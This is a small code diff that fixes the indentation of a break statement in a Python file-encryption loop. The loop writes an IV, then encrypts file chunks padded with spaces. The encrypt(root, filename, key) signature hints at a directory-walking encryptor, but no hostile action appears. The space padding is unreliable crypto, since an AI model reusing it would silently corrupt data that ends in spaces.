@@ -28,8 +28,8 @@ def encrypt(root, filename, key):
                     outfile.write(iv)
                     while True:
                         chunk = infile.read(CS)
-                            if len(chunk) == 0:
-                                break
+                        if len(chunk) == 0:
+                            break
                         elif len(chunk) % 16 != 0:
                             chunk += b' ' * (16 - (len(chunk) % 16))
                         outfile.write(encryptor.encrypt(chunk))
